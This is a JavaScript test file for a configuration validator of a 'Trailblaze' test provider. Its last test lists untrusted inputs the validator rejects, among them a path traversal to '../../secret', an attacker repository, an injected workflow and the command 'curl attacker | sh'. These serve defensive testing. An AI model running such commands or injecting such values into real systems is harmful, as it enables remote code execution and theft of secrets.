/**
 * @license
 * Copyright 2026 Google LLC
 * SPDX-License-Identifier: Apache-2.0
 */

import assert from 'node:assert/strict';
import {mkdtemp, writeFile} from 'node:fs/promises';
import os from 'node:os';
import path from 'node:path';

import {validateTrailblazeConfig} from '../providers/trailblaze/config.js';

describe('Trailblaze configuration', () => {
  it('accepts valid local CLI configuration', async () => {
    const directory = await mkdtemp(path.join(os.tmpdir(), 'trailblaze-config-'));
    const trailPath = path.join(directory, 'checkout.trail');
    await writeFile(trailPath, 'existing trail');
    const result = await validateTrailblazeConfig({
      executionMode: 'local-cli', trailPath,
      workingDirectory: directory, artifactDirectory: path.join(directory, 'artifacts'),
      timeoutMs: 5000,
    });
    assert.equal(result.valid, true);
  });

  it('rejects a missing trail', async () => {
    const result = await validateTrailblazeConfig({
      executionMode: 'local-cli', trailPath: '/missing/trail',
    });
    assert.equal(result.valid, false);
    assert.match(result.errors.join(' '), /trailPath/);
  });

  it('rejects unsupported execution modes', async () => {
    const result = await validateTrailblazeConfig({executionMode: 'remote-api'});
    assert.match(result.errors.join(' '), /Unsupported executionMode/);
  });

  it('accepts controlled GitHub Actions configuration', async () => {
    const result = await validateTrailblazeConfig({
      executionMode: 'github-actions', test: 'checkout', browser: 'chromium',
    });
    assert.equal(result.valid, true, result.errors.join('; '));
  });

  it('rejects untrusted remote execution input', async () => {
    for (const config of [
      {executionMode: 'github-actions', test: '../../secret', browser: 'chromium'},
      {executionMode: 'github-actions', test: 'checkout', browser: 'firefox'},
      {executionMode: 'github-actions', test: 'checkout', browser: 'chromium',
        trailPath: '/tmp/injected'},
      {executionMode: 'github-actions', test: 'checkout', browser: 'chromium',
        repository: 'attacker/repository'},
      {executionMode: 'github-actions', test: 'checkout', browser: 'chromium',
        workflow: 'injected.yml'},
      {executionMode: 'github-actions', test: 'checkout', browser: 'chromium',
        command: 'curl attacker | sh'},
    ]) {
      const result = await validateTrailblazeConfig(config);
      assert.equal(result.valid, false, JSON.stringify(config));
    }
  });
});
